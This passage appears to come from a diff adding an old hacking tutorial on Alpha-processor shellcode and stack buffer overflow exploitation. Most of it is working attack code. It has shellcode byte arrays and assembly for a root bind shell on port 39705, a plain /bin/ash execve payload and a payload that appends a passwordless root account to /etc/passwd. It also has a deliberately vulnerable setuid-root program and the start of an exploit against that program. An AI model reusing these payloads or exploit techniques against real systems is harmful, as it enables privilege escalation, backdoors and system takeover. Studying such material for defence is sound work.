+unsigned char alpha_portshellcode[] = /* XXX shellcode by andrew_darqui */
+
+                                     /*   NOTE:    exec's ash    */
+"\x9a\x02\x5a\x23"                   /*   lda      ra,666(ra)    */
+"\x73\xfd\xfa\xb3"                   /*   stl      zero,-653(ra) */
+"\x92\xfd\x3a\x21"                   /*   lda      s0,-622(ra)   */
+"\x83\xff\xff\xff"                   /*   data                   */
+"\xff\xff\xff\xff"                   /*   data                   */
+"\x01\x80\xe9\x6b"                   /*   ret      zero,(s0),0x1 */
+"\xff\xff\x9b\x19"                   /*   data                   */
+"\xff\xff\xff\xff"                   /*   data                   */
+"\x2f\x62\x69\x6e"                   /*   data                   */
+"\x2f\x61\x73\x68"                   /*   data                   */
+"\xff\xff\xff\xff"                   /*   data                   */
+"\x80\x34\xec\x47"                   /*   cmoveq   zero,0x61,v0 */
+"\x90\x54\xe0\x47"                   /*   cmoveq   zero,0x2,a0   */
+"\x91\x34\xe0\x47"                   /*   cmoveq   zero,0x1,a1   */
+"\x92\x04\xff\x47"                   /*   cmoveq   zero,zero,a2 */
+"\xf3\xff\x3f\xd1"                   /*   bsr      s0,CALLSYS    */
+"\x81\x04\xe0\x47"                   /*   cmoveq   zero,v0,t0    */
+"\x82\xfd\xfa\xb3"                   /*   stl      zero,-638(ra) */
+"\x80\x14\xed\x47"                   /*   cmoveq   zero,0x68,v0 */
+"\x90\x04\xe1\x47"                   /*   cmoveq   zero,t0,a0    */
+"\x7e\xfd\x3a\x22"                   /*   lda      a1,-642(ra)   */
+"\x92\x14\xe2\x47"                   /*   cmoveq   zero,0x10,a2 */
+"\xec\xff\x3f\xd1"                   /*   bsr      s0,CALLSYS    */
+"\x91\x34\xe0\x47"                   /*   cmoveq   zero,0x1,a1   */
+"\x80\x54\xed\x47"                   /*   cmoveq   zero,0x6a,v0 */
+"\xe9\xff\x3f\xd1"                   /*   bsr      s0,CALLSYS    */
+"\x80\x74\xec\x47"                   /*   cmoveq   zero,0x63,v0 */
+"\xe7\xff\x3f\xd1"                   /*   bsr      s0,CALLSYS    */
+"\x90\x04\xe0\x47"                   /*   cmoveq   zero,v0,a0    */
+"\x80\x54\xeb\x47"                   /*   cmoveq   zero,0x5a,v0 */
+"\x91\x04\xff\x47"                   /*   cmoveq   zero,zero,a1 */
+"\xe3\xff\x3f\xd1"                    /*   bsr      s0,CALLSYS      */
+"\x80\x54\xeb\x47"                    /*   cmoveq   zero,0x5a,v0    */
+"\x91\x34\xe0\x47"                    /*   cmoveq   zero,0x1,a1     */
+"\xe0\xff\x3f\xd1"                    /*   bsr      s0,CALLSYS      */
+"\x80\x74\xe7\x47"                    /*   cmoveq   zero,0x3b,v0    */
+"\x91\x04\xff\x47"                    /*   cmoveq   zero,zero,a1    */
+"\x92\x04\xff\x47"                    /*   cmoveq   zero,zero,a2    */
+"\x86\xfd\x1a\x22"                    /*   lda      a0,-634(ra)     */
+"\x8e\xfd\xfa\xb3"                    /*   stl      zero,-626(ra)   */
+"\xda\xff\x3f\xd1"                    /*   bsr      s0,CALLSYS      */
+;
+
+
+#define BUFF_SIZE 16
+#define EXTRA     8
+#define RA        8
+
+signed int
+vuln_func(char *string)
+{
+    char            buffer[BUFF_SIZE];
+
+
+     strcpy(buffer, string);
+
+     return 0;
+}
+
+
+int
+main(int argc, char *argv[])
+{
+    unsigned long   saddr = (unsigned long) &alpha_portshellcode;
+    unsigned char *area = NULL;
+
+
+     printf("The address of our shellcode -> 0x%lx\n", saddr);
+
+     area = (unsigned char *) calloc(1, BUFF_SIZE + EXTRA + RA);
+     if (area == NULL) {
+         puts("main() : calloc() : Failed");
+         exit(-1);
+     }
+
+     memset(area, 'A'           /*
+                                 * 0x41
+                                 */ , (BUFF_SIZE + EXTRA));
+
+     *(unsigned long *) (area + BUFF_SIZE + EXTRA) = (unsigned long) saddr;
+
+     puts("Overwriting main()'s return address, should run the portshell!");
+
+     vuln_func(area);
+
+     return 0;
+};
+
++END portshell_ash.c
++BEGIN portshell_ash_setuid.s
+
+.equ   SYS_socket,97
+.equ   SYS_bind, 104
+.equ   SYS_listen,106
+.equ   SYS_accept,99
+.equ   SYS_dup2,90
+.equ   SYS_setuid,23
+.equ   SYS_execve,59
+
+
+.globl main
+.type main,@function
+
+
+main:
+
+.Lnot_used:
+bsr $26, .Lwould_begin
+
+.Lwould_begin:
+# Address of our shellcode in register[ra]
+lda $26, 666($26)
+
+
+# Setup our palcode callsys routine
+stl $31, -653($26)
+
+
+# s0 aka $9 will be for return after the callsys..
+# this is the first branch to the rest of the portshell
+# to the first cmoveq after the ret ;)
+lda $9, -622($26)
+
+.Lcallsys:
+.ascii "\x83\xff\xff\xff"
+.ascii "\xff\xff\xff\xff"
+ret $31, ($9), 0x1
+
+# WE'RE GONNA STORE ALL THE DATA AFTER THIS RET!
+.ascii "\xff\xff\x9b\x19\xff\xff\xff\xff"
+#       family port     address
+
+# DATA FOR EXECVE! "/bin/ash\0!!!!!!!!"
+.ascii "/bin/ash\xff\xff\xff\xff"
+
+
+# SOCKET
+# fd = socket(AF_INET, SOCK_STREAM, 0)
+# SOCKET
+cmoveq $31, SYS_socket, $0
+cmoveq $31, 2, $16
+cmoveq $31, 1, $17
+cmoveq $31, $31, $18
+
+bsr $9, .Lcallsys
+
+
+# Save the fd
+cmoveq $31, $0, $1
+
+
+# BIND
+# bind(fd, { -1, 39705, INADDR_ANY }, sizeof(struct sockaddr_in))
+# BIND
+stl $31, -638($26)
+cmoveq $31, SYS_bind, $0
+cmoveq $31, $1, $16
+lda $17, -642($26)
+cmoveq $31, 16, $18
+
+bsr $9, .Lcallsys
+
+
+# LISTEN
+# listen(fd, 1)
+# LISTEN
+cmoveq $31, 1, $17
+cmoveq $31, SYS_listen, $0
+
+bsr $9, .Lcallsys
+
+
+# ACCEPT
+# nfd = accept(fd, NULL, NULL)
+# ACCEPT
+cmoveq $31, SYS_accept, $0
+
+bsr $9, .Lcallsys
+
+
+# Save NFD!
+cmoveq $31, $0, $16
+
+
+# DUP2
+# dup2(nfd, 0)
+# DUP2
+cmoveq $31, SYS_dup2, $0
+cmoveq $31, $31, $17
+
+bsr $9, .Lcallsys
+
+
+# DUP2
+# dup2(nfd, 1)
+# DUP2
+cmoveq $31, SYS_dup2, $0
+cmoveq $31, 1, $17
+
+bsr $9, .Lcallsys
+
+
+# SETUID
+# setuid(0)
+# SETUID
+cmoveq $31, SYS_setuid, $0
+cmoveq $31, $31, $16
+
+bsr $9, .Lcallsys
+
+
+# EXECVE
+# execve("/bin/ash"...)
+# EXECVE
+cmoveq $31, SYS_execve, $0
+cmoveq $31, $31, $17
+cmoveq $31, $31, $18
+
+lda $16, -634($26)
+
+stl $31, -626($26)
+
+bsr $9, .Lcallsys
+
+# This file was not truncated, the end ;-)
+
++END portshell_ash_setuid.s
+
+
++BEGIN portshell_ash_setuid.c
+
+/* Sat Jul 1 02:00:23 GMT 2000
+ * Author:
+ *    andrew_darqui of someplace
+ * Notes:
+ *    note, the return address should point to first instruction
+ *
+ * This spawns an /bin/ash shell on port 39705
+ * - issues a setuid 0 b4 execve
+ *
+ * Length:
+ *    176 bytes! (i think this is small for alpha.. ;)
+ *
+ * werd to the alpha
+ */
+
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+
+unsigned char alpha_pshell_setuid[] = /* XXX shellcode by andrew_darqui */
+
+                                     /*   NOTE:    exec's ash    */
+"\x9a\x02\x5a\x23"                   /*   lda      ra,666(ra)    */
+"\x73\xfd\xfa\xb3"                   /*   stl      zero,-653(ra) */
+"\x92\xfd\x3a\x21"                   /*   lda      s0,-622(ra)   */
+"\x83\xff\xff\xff"                   /*   data                   */
+"\xff\xff\xff\xff"                   /*   data                   */
+"\x01\x80\xe9\x6b"                   /*   ret      zero,(s0),0x1 */
+"\xff\xff\x9b\x19"                   /*   data                   */
+"\xff\xff\xff\xff"                   /*   data                   */
+"\x2f\x62\x69\x6e"                   /*   data                   */
+"\x2f\x61\x73\x68"                   /*   data                   */
+"\xff\xff\xff\xff"                   /*   data                   */
+"\x80\x34\xec\x47"                   /*   cmoveq   zero,0x61,v0 */
+"\x90\x54\xe0\x47"                   /*   cmoveq   zero,0x2,a0   */
+"\x91\x34\xe0\x47"                   /*   cmoveq   zero,0x1,a1   */
+"\x92\x04\xff\x47"                   /*   cmoveq   zero,zero,a2 */
+"\xf3\xff\x3f\xd1"                   /*   bsr      s0,CALLSYS    */
+"\x81\x04\xe0\x47"                   /*   cmoveq   zero,v0,t0    */
+"\x82\xfd\xfa\xb3"                   /*   stl      zero,-638(ra) */
+"\x80\x14\xed\x47"                   /*   cmoveq   zero,0x68,v0 */
+"\x90\x04\xe1\x47"                   /*   cmoveq   zero,t0,a0    */
+"\x7e\xfd\x3a\x22"                   /*   lda      a1,-642(ra)   */
+"\x92\x14\xe2\x47"                   /*   cmoveq   zero,0x10,a2 */
+"\xec\xff\x3f\xd1"                   /*   bsr      s0,CALLSYS    */
+"\x91\x34\xe0\x47"                   /*   cmoveq   zero,0x1,a1     */
+"\x80\x54\xed\x47"                   /*   cmoveq   zero,0x6a,v0    */
+"\xe9\xff\x3f\xd1"                   /*   bsr      s0,CALLSYS      */
+"\x80\x74\xec\x47"                   /*   cmoveq   zero,0x63,v0    */
+"\xe7\xff\x3f\xd1"                   /*   bsr      s0,CALLSYS      */
+"\x90\x04\xe0\x47"                   /*   cmoveq   zero,v0,a0      */
+"\x80\x54\xeb\x47"                   /*   cmoveq   zero,0x5a,v0    */
+"\x91\x04\xff\x47"                   /*   cmoveq   zero,zero,a1    */
+"\xe3\xff\x3f\xd1"                   /*   bsr      s0,CALLSYS      */
+"\x80\x54\xeb\x47"                   /*   cmoveq   zero,0x5a,v0    */
+"\x91\x34\xe0\x47"                   /*   cmoveq   zero,0x1,a1     */
+"\xe0\xff\x3f\xd1"                   /*   bsr      s0,CALLSYS      */
+"\x80\xf4\xe2\x47"                   /*   cmoveq   zero,0x17,v0    */
+"\x90\x04\xff\x47"                   /*   cmoveq   zero,zero,a0    */
+"\xdd\xff\x3f\xd1"                   /*   bsr      s0,CALLSYS      */
+"\x80\x74\xe7\x47"                   /*   cmoveq   zero,0x3b,v0    */
+"\x91\x04\xff\x47"                   /*   cmoveq   zero,zero,a1    */
+"\x92\x04\xff\x47"                   /*   cmoveq   zero,zero,a2    */
+"\x86\xfd\x1a\x22"                   /*   lda      a0,-634(ra)     */
+"\x8e\xfd\xfa\xb3"                   /*   stl      zero,-626(ra)   */
+"\xd7\xff\x3f\xd1"                   /*   bsr      s0,CALLSYS      */
+;
+
+
+#define BUFF_SIZE 16
+#define EXTRA    8
+#define RA       8
+
+
+signed int
+vuln_func(char *string)
+{
+    char            buffer[BUFF_SIZE];
+
+
+    strcpy(buffer, string);
+
+    return 0;
+}
+
+
+int
+main(int argc, char *argv[])
+{
+    unsigned long   saddr = (unsigned long) &alpha_pshell_setuid;
+    unsigned char *area = NULL;
+
+
+    printf("The address of our shellcode -> 0x%lx\n", saddr);
+
+    area = (unsigned char *) calloc(1, BUFF_SIZE + EXTRA + RA);
+    if (area == NULL) {
+        puts("main() : calloc() : Failed");
+        exit(-1);
+    }
+
+    memset(area, 'A'           /*
+                                * 0x41
+                                */ , (BUFF_SIZE + EXTRA));
+
+    *(unsigned long *) (area + BUFF_SIZE + EXTRA) = (unsigned long) saddr;
+     puts("Overwriting main()'s return address, should run the portshell!");
+
+     vuln_func(area);
+
+     return 0;
+};
+
++END portshell_ash_setuid.c
+
+
+       Ok, there is many files:
+
+       * execve_ash.s
+       * execve_ash.c
+
+       * passwd.s
+       * passwd.c
+
+       * portshell_ash.s
+       * portshell_ash.c
+
+       * portshell_ash_setuid.s
+       * portshell_ash_setuid.c
+
+       Now you should be able to write real efficient Alpha shellcode.
+       On to the next section!
+
+
+<06 : Writing an Alpha exploit>
+
+       In stack based buffer overflows, the concept is that we overflow
+       a buffer with user data (shellcode), we also overwrite the
+       return address with a stack address that `points' to either
+       nops, or the first instruction of our shellcode.
+
+                 strcpy((vulnerable buffer) 0xBLAH, (user_data)0xBLOO)
+
+       Once the vulnerable program returns into our shellcode (nops
+       to shellcode), we will execute all instructions in the shellcode,
+       such as those mentioned above: executing a shell, appending
+       to passwd file, or starting a portshell etc.
+
+       In the previous section (Writing Alpha Shellcode), we went
+       over a very efficient method of writing shellcode, which
+       also makes it significantly smaller. Of course, there are
+       other methods of writing shellcode (as discussed earlier).
+       The problem with Alpha is, we can't really go into our own
+       little world within the shellcode, we *DON'T* know where we
+       are. This is because, forward branches contain NULLs. Of course
+       ret's don't, but, we can't use the ret instruction to jump
+       into our shellcode, this is, because we don't know where our
+       shellcode is. From what i just said, we can't `ret' forward,
+       to an instruction, which would say, branch back, and store the
+       updated pc in a register. If we could do this, we would really
+       not be having this conversation, or paper for that matter!
+
+                 ret $zero, ($REGISTER), 0x1
+                           ^^^ Address in register, which we don't know
+
+       The other approaches in the Writing Alpha Shellcode section, which
+       isn't the main focus of this paper, would have been to say:
+      "Well who cares where we are, I will place all shellcode
+       valuable data onto the stack somewhere."
+
+Of course this is a fine approach, but it will significantly
+increase the size of our shellcode. What we would do is, take
+the previous address of our stack pointer (sp), and load say,
+1024 bytes + sp back into sp. This will give us some area
+way up on the stack, hopefully not where our shellcode (which is
+not very likely to happen :). Now we will load all valuable
+shellcode data in this location. We would load /etc/passwd and
+our append string here, if we were using some passwd shellcode.
+We would load /bin/WHATEVERSHELL plus all of the socket and
+address info data if we were using a portshellcode. Also, we
+would have to load an callsys, plus a ret, just like how our
+main shellcode approach works:
+
+      <somewhere on the stack>
+      "/bin/ash"
+      "/etc/passwd"
+      ...
+      callsys
+      ret $zero, ($s0), 0x1
+      <somewhere on the stack>
+
+Storing all of this information would be very painful, since we
+can't store 32 bit values into registers, we would have to use
+some `bis' instruction (LOGICAL OR), to pack the right data
+into registers, then store this data on the stack (We can't
+place `32bit' values anywhere, because the instructions themselves
+are 32bits, as explained earlier). Say perhaps placing the data
+in the register takes 2 instructions, then 1 more for a store
+instruction. You can see how inefficient this will be, so anyways,
+on to the next!
+
+So our approach was to use an lda (load address) instruction, as
+our first instruction of the shellcode.
+
+      lda $ra, 666($ra)
+          ^^^ New address
+
+If we exploit a vulnerable program, we would now have to overwrite
+the saved return address with the *EXACT* address of the first
+instruction of our shellcode (lda..). If you have done anything with
+exploits before (which I'm sure you have), you know this will
+not likely work, or it will take extensive gdb'ing (debugging)
+to figure out the return address. Below is what our attack buffer
+would look like if we used this method:
+
+      <evil instructions><evil return address>
+
+There's not much room for error in this approach, but you can
+actually get it working.
+
+I'm assuming you might ask this question:
+
+      "Why can't we use nop's (or noplike instructions)
+       in our attack buffer?"
+
+If we take the approach of putting nop's in the attack buffer,
+we will run into this scenario :<
+
+      <lots of nops><evil instructions><evil return address>
+
+     The problem here is, in our shellcode, we assumed the vulnerable
+     program would return *DIRECTLY* to our first instruction. This
+     will obviously not be the case if we land in any of the <nop>'s.
+     Our offsets might be off by four, eight, two million (who cares),
+     the point is, they will be off. With any of the offsets incorrect,
+     our shellcode will take a turn for the worst, and we will end up
+     being unsuccessful in hacking the vulnerable program.
+
+     We need some kind of nop's! Why not use ret's as nops (of course
+     this was not as easy to think of as that :)? Hm, let's see:
+
+            <ret><ret><ret><evil instructions><evil ret>
+            ^^^ ret instructions
+
+            *or*
+
+            <rets><evil instructions><evil ret>
+
+     We are going to chain the ret instructions up, one after
+     another. A better look at our attack buffer:
+
+            ret $ra, ($ra), 0x1
+               ret $ra, ($ra), 0x1
+               ret $ra, ($ra), 0x1
+               ret $ra, ($ra), 0x1
+               ret $ra, ($ra), 0x1
+            <repeat more of the above ret's>
+            lda $ra, 666($ra)
+            <rest of shellcodes>
+
+     To analyze this, lets say we land on one of the ret
+     instructions. The first thing that happens, is the ret
+     instruction will get ready to branch to whatever is in
+     the ra register. Notice how we are storing the updated
+     pc in the ra register as well. This updated pc is the
+     next instruction to be executed in the stream.
+
+     Quickly check out how the ret instruction actually works
+     (This process can be completed in 4 easy steps!):
+
+            ret <registerA>, <(registerB>, 0x1
+
+            A) Update the PC
+
+            B) register `va' = value of registerB and (NOT 3)
+               register `va' is the virtual address translation
+               register, it is used by the address translation
+               hardware. It is also a very important element
+               when switching to BIG ENDIAN byte ordering.
+
+            C) registerA = PC (which has been updated)
+
+            D) PC = register va (this transfers control
+               to the new address)
+
+
+     Let us take a simplified look at the chaining process, we will be
+     using three ret instructions, then we will finally hit the
+     lda instruction (first instruction of our shellcode). And from
+     there on, we will assume our shellcode runs the way we want it
+     to.
+
+AA: ret $ra, ($ra), 0x1
+ registerA = address AA
+ registerB = address AA
+
+   A)   Update the PC (PC is now at address BB)
+   B)   Register va = address in registerB (va = AA)
+   C)   registerA (register ra) = PC (which is at BB)
+   D)   PC = register va (va is at address AA)
+   We   now transfer control to address `AA' again
+
+AA: ret $ra, ($ra), 0x1
+
+ registerA = address BB
+ registerB = address BB
+
+   A)   Update the PC (PC is now at address BB)
+   B)   Register va = address in registerB (va = BB)
+   C)   registerA (register ra) = PC (which is at BB)
+   D)   PC = register va (va is at BB)
+   We   now transfer control to address `BB'
+
+BB: ret $ra, ($ra), 0x1
+
+ registerA = address BB
+ registerB = address BB
+
+   A)   Update the PC (PC is now at address CC)
+   B)   Register va = address in registerB (va = BB)
+   C)   registerA (register ra) = PC (which is at CC)
+   D)   PC = register va (va is at BB)
+   We   now transfer control to address `BB' again
+
+BB: ret $ra, ($ra), 0x1
+
+ registerA = address CC
+ registerB = address CC
+
+   A)   Update the PC (PC is now at address CC)
+   B)   Register va = address in registerB (va = CC)
+   C)   registerA (register ra) = PC (which is at CC)
+   D)   PC = register va (va is at CC)
+   We   now transfer control to address 'CC'
+
+CC: ret $ra, ($ra), 0x1
+
+ registerA = address CC
+ registerB = address CC
+
+   A)   Update the PC (PC is now at address DD)
+   B)   Register va = address in registerB (va = CC)
+   C)   registerA (register ra) = PC (which is at DD)
+   D)   PC = register va (va is at CC)
+   We   now transfer control to address 'CC' again
+
+CC: ret $ra, ($ra), 0x1
+
+ registerA = address DD
+ registerB = address DD
+
+   A)   Update the PC (PC is now at address DD)
+   B)   Register va = address in registerB (va = DD)
+   C)   registerA (register ra) = PC (which is at DD)
+   D)   PC = register va (va is at DD)
+    We now transfer control to address 'DD'
+
+DD: lda $ra, 666($ra)
+
+    A) We are finally at the first instruction of our shellcode, which
+       does basically most of the work! As from the previous ret instruction,
+       register ra should contain the address of the lda instruction
+       (address DD), register ra was also registerA and registerB
+       in the previous ret instruction.
+
+EE: ...
+
+FF: ...
+
+GG: ...
+
+      For our first example, we will be trying to exploit lvuln.c. This
+      program has a common buffer overflow vulnerability in the strcpy()
+      routine being called. Note the inline ASM's are there just too
+      help you with debugging and such.
+
++BEGIN lvuln.c
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+
+void
+noop(void)
+{
+    return;
+}
+
+int
+vuln(char *str)
+{
+    char              buff[512];
+
+    __asm__("beg:");
+
+    strcpy(buff, str);
+
+    noop();
+
+    __asm__("end:");
+    return (0);
+}
+
+
+int
+main(int argc, char *argv[])
+{
+    int             i;
+
+
+    if (argc > 1)
+        vuln(argv[1]);
+
+    i = 1;
+    return (0);
+}
+
++END lvuln.c
+
+      Let's compile this program without optimizations, chown it
+      to root, and add setuid.
+
+               # gcc lvuln.c -o lvuln
+               # chown root ./lvuln
+               # chmod +s ./lvuln
+
+               $ ls -al ./lvuln
+               -rwsrwsr-x   1 root        root       155434 Sep 21 23:23 ./lvuln
+
+      Let's take a look at what our stack should look like. The main()
+      procedure subtracts 48 bytes from the stack and the vuln()
+      procedure subtracts 544 bytes from the stack.
+
+               main() procedure:
+               0x1200004a8 <main+8>:      subq   sp,0x30,sp
+
+               vuln() procedure:
+               0x120000448 <vuln+8>:      lda    sp,-544(sp)
+
+.----------------------------.
+| Higher memory addresses    |
+SSSSSSSSSSSSSSSSSSSSSSSSSSSSSS
+S----------------------------S
+S local                      S   40(fp) local quad4
+S----------------------------S
+S int i                      S   32(fp) local quad3
+S----------------------------S
+S local                      S   24(fp) local quad2
+S----------------------------S
+S local                      S   16(fp) local quad1
+S----------------------------S
+S saved fp                   S   8(fp)
+S----------------------------S
+S saved ra                   S   0(fp)
+S----------------------------S   <- main()'s frame
+::::::::::::::::::::::::::::::
+::::::::::::::::::::::::::::::
+::::::::::::::::::::::::::::::
+S----------------------------S   <- vuln()'s frame
+S local (padding)            S   536(fp) (536-544)
+S----------------------------S
+S buffer                     S   280 - 536(fp)
+S----------------------------S
+S buffer                     S   24 - 280(fp) (begin of buffer address)
+S----------------------------S
+S local (tmp, used for arg) S    16(fp)
+S----------------------------S
+S saved fp                   S   8(fp)
+S----------------------------S
+S saved ra                   S   0(fp)
+S----------------------------S
+| Lesser memory addresses    |
+`----------------------------'
+
+      If from the base of the buffer (24) to the end of the buffer
+      (536) is 512 bytes, we still need 8 bytes of the local
+      padding. So the total amount of space for shellcode+rets is
+      now 512+8 = 520. We also need 8 more bytes to overwrite the
+      return address. With that said, our attack buffer should
+      look like so:
+
+                <rets><shellcode><evil ret>
+                   ^^0 through 520^^     ^ return into stack
+
+      Lets whip out exp1.c, our first example exploit, which will
+      exploit lvuln.c.
+
++BEGIN exp1.c
+
+/*
+ * exp1 - Exploit for `lvuln.c' (without optimizations)
+ *
+ * by andrew_darqui of someplace
+ */
+
+
+#include   <stdio.h>
+#include   <stdlib.h>
+#include   <string.h>
+#include   <unistd.h>
+
+
+/********************************************************************
+ * PRELIMINARY                                                      *
+ ********************************************************************/
+
+#define   BUFF_SIZE         512
+#define   EXTRA             8
+#define   RA                8
+#define   OFFSET            800
+#define   ALPHA_ADDR_ALGN   8
+#define   ALPHA_INSN_ALGN   4
+
+
+unsigned char alpha_exec_shellcode[] = /* XXX shellcode by andrew_darqui */
+
+                                         /*   NOTE:    exec /bin/ash */
+"\x9a\x02\x5a\x23"                       /*   lda      ra,666(ra)    */
+"\x73\xfd\xfa\xb3"                       /*   stl      zero,-653(ra) */
+"\x86\xfd\x3a\x21"                       /*   lda      s0,-634(ra)   */
+"\x83\xff\xff\xff"                       /*   data     (callsys)     */
+"\xff\xff\xff\xff"                       /*   data     (bgt)         */
+"\x01\x80\xe9\x6b"                       /*   ret      zero,(s0),0x1 */
+"\x2f\x62\x69\x6e"                       /*   data                   */
+"\x2f\x61\x73\x68"                       /*   data                   */
+"\x80\xf4\xe2\x47"                       /*   cmoveq   zero,0x17,v0 */
+"\x90\x04\xff\x47"                       /*   cmoveq   zero,zero,a0 */
+"\xf8\xff\x3f\xd1"                       /*   bsr      s0,CALLSYS    */
+"\x80\x74\xe7\x47"                       /*   cmoveq   zero,0x3b,v0 */
+"\x86\xfd\xfa\xb3"                       /*   stl      zero,-634(ra) */
+"\x7e\xfd\x1a\x22"                       /*   lda      a0,-642(ra)   */
+"\x91\x04\xff\x47"                       /*   cmoveq   zero,zero,a1 */
+"\x92\x04\xff\x47"                       /*   cmoveq   zero,zero,a2 */
+"\xf2\xff\x3f\xd1"                       /*   bsr      s0,CALLSYS    */
+;
+
+
+unsigned char alpha_passwd_shellcode[] = /* XXX shellcode by andrew_darqui */
+
+"\x9a\x02\x5a\x23"                        /*   lda      ra,666(ra)    */
+"\x73\xfd\xfa\xb3"                        /*   stl      zero,-653(ra) */
+"\xa2\xfd\x3a\x21"                        /*   lda      s0,-606(ra)   */
+"\x83\xff\xff\xff"                        /*   data                   */
+"\xff\xff\xff\xff"                        /*   data                   */
+"\x01\x80\xe9\x6b"                        /*   ret      zero,(s0),0x1 */
+"\x2f\x65\x74\x63"                        /*   data                   */
+"\x2f\x70\x61\x73"                        /*   data                   */
+"\x73\x77\x64\xff"                        /*   data                   */
+"\xff\xff\xff\x78"                        /*   data                   */
+"\x3a\x3a\x30\x3a"                        /*   data                   */
+"\x30\x3a\x3a\x2f"                        /*   data                   */
+"\x3a\x2f\x62\x69"                        /*   data                   */
+"\x6e\x2f\x73\x68"                        /*   data                   */
+"\x0a\xff\xff\xff"                        /*   data                   */
+"\x80\xb4\xe5\x47"                        /*   cmoveq   zero,0x2d,v0 */
+"\x7e\xfd\x1a\x22"                        /*   lda      a0,-642(ra)   */
+"\x89\xfd\xfa\xb3"                        /*   stl      zero,-631(ra) */
+"\x91\x54\xe1\x47"                        /*   cmoveq   zero,0xa,a1   */
+"\xef\xff\x3f\xd1"                        /*   bsr      s0, CALLSYS   */
+"\x90\x04\xe0\x47"                        /*   cmoveq   zero,v0,a0    */
+"\x90\x04\xe0\x47"                        /*   cmoveq   zero,v0,a0    */
+"\x80\x94\xe0\x47"                        /*   cmoveq   zero,0x4,v0   */
+"\x8d\xfd\x3a\x22"                        /*   lda      a1,-627(ra)   */
+"\x92\x54\xe2\x47"                        /*   cmoveq   zero,0x12,a2 */
+"\xea\xff\x3f\xd1"                        /*   bsr      s0, CALLSYS   */
+"\x80\x34\xe0\x47"                        /*   cmoveq   zero,0x1,v0   */
+"\xe8\xff\x3f\xd1"                        /*   bsr      s0, CALLSYS   */
+;
+
+
+unsigned char alpha_portshellcode[] = /* XXX shellcode by andrew_darqui */
+
+                                     /*   NOTE:    exec's ash    */
+"\x9a\x02\x5a\x23"                   /*   lda      ra,666(ra)    */
+"\x73\xfd\xfa\xb3"                   /*   stl      zero,-653(ra) */
+"\x92\xfd\x3a\x21"                   /*   lda      s0,-622(ra)   */
+"\x83\xff\xff\xff"                   /*   data                   */
+"\xff\xff\xff\xff"                   /*   data                   */
+"\x01\x80\xe9\x6b"                   /*   ret      zero,(s0),0x1 */
+"\xff\xff\x9b\x19"                   /*   data                   */
+"\xff\xff\xff\xff"                   /*   data                   */
+"\x2f\x62\x69\x6e"                   /*   data                   */
+"\x2f\x61\x73\x68"                   /*   data                   */
+"\xff\xff\xff\xff"                   /*   data                   */
+"\x80\x34\xec\x47"                   /*   cmoveq   zero,0x61,v0 */
+"\x90\x54\xe0\x47"                   /*   cmoveq   zero,0x2,a0   */
+"\x91\x34\xe0\x47"                   /*   cmoveq   zero,0x1,a1   */
+"\x92\x04\xff\x47"                   /*   cmoveq   zero,zero,a2 */
+"\xf3\xff\x3f\xd1"                   /*   bsr      s0,CALLSYS    */
+"\x81\x04\xe0\x47"                   /*   cmoveq   zero,v0,t0    */
+"\x82\xfd\xfa\xb3"                   /*   stl      zero,-638(ra) */
+"\x80\x14\xed\x47"                   /*   cmoveq   zero,0x68,v0 */
+"\x90\x04\xe1\x47"                   /*   cmoveq   zero,t0,a0    */
+"\x7e\xfd\x3a\x22"                   /*   lda      a1,-642(ra)   */
+"\x92\x14\xe2\x47"                   /*   cmoveq   zero,0x10,a2 */
+"\xec\xff\x3f\xd1"                   /*   bsr      s0,CALLSYS    */
+"\x91\x34\xe0\x47"                   /*   cmoveq   zero,0x1,a1   */
+"\x80\x54\xed\x47"                   /*   cmoveq   zero,0x6a,v0 */
+"\xe9\xff\x3f\xd1"                   /*   bsr      s0,CALLSYS    */
+"\x80\x74\xec\x47"                   /*   cmoveq   zero,0x63,v0 */
+"\xe7\xff\x3f\xd1"                   /*   bsr      s0,CALLSYS    */
+"\x90\x04\xe0\x47"                   /*   cmoveq   zero,v0,a0      */
+"\x80\x54\xeb\x47"                   /*   cmoveq   zero,0x5a,v0    */
+"\x91\x04\xff\x47"                   /*   cmoveq   zero,zero,a1    */
+"\xe3\xff\x3f\xd1"                   /*   bsr      s0,CALLSYS      */
+"\x80\x54\xeb\x47"                   /*   cmoveq   zero,0x5a,v0    */
+"\x91\x34\xe0\x47"                   /*   cmoveq   zero,0x1,a1     */
+"\xe0\xff\x3f\xd1"                   /*   bsr      s0,CALLSYS      */
+"\x80\x74\xe7\x47"                   /*   cmoveq   zero,0x3b,v0    */
+"\x91\x04\xff\x47"                   /*   cmoveq   zero,zero,a1    */
+"\x92\x04\xff\x47"                   /*   cmoveq   zero,zero,a2    */
+"\x86\xfd\x1a\x22"                   /*   lda      a0,-634(ra)     */
+"\x8e\xfd\xfa\xb3"                   /*   stl      zero,-626(ra)   */
+"\xda\xff\x3f\xd1"                   /*   bsr      s0,CALLSYS      */
+;
+
+
+unsigned char alpha_pshell_setuid[] = /* XXX shellcode by andrew_darqui */
+
+                                     /*   NOTE:    exec's ash    */
+"\x9a\x02\x5a\x23"                   /*   lda      ra,666(ra)    */
+"\x73\xfd\xfa\xb3"                   /*   stl      zero,-653(ra) */
+"\x92\xfd\x3a\x21"                   /*   lda      s0,-622(ra)   */
+"\x83\xff\xff\xff"                   /*   data                   */
+"\xff\xff\xff\xff"                   /*   data                   */
+"\x01\x80\xe9\x6b"                   /*   ret      zero,(s0),0x1 */
+"\xff\xff\x9b\x19"                   /*   data                   */
+"\xff\xff\xff\xff"                   /*   data                   */
+"\x2f\x62\x69\x6e"                   /*   data                   */
+"\x2f\x61\x73\x68"                   /*   data                   */
+"\xff\xff\xff\xff"                   /*   data                   */
+"\x80\x34\xec\x47"                   /*   cmoveq   zero,0x61,v0 */
+"\x90\x54\xe0\x47"                   /*   cmoveq   zero,0x2,a0   */
+"\x91\x34\xe0\x47"                   /*   cmoveq   zero,0x1,a1   */
+"\x92\x04\xff\x47"                   /*   cmoveq   zero,zero,a2 */
+"\xf3\xff\x3f\xd1"                   /*   bsr      s0,CALLSYS    */
+"\x81\x04\xe0\x47"                   /*   cmoveq   zero,v0,t0    */
+"\x82\xfd\xfa\xb3"                   /*   stl      zero,-638(ra) */
+"\x80\x14\xed\x47"                   /*   cmoveq   zero,0x68,v0 */
+"\x90\x04\xe1\x47"                   /*   cmoveq   zero,t0,a0    */
+"\x7e\xfd\x3a\x22"                   /*   lda      a1,-642(ra)   */
+"\x92\x14\xe2\x47"                   /*   cmoveq   zero,0x10,a2 */
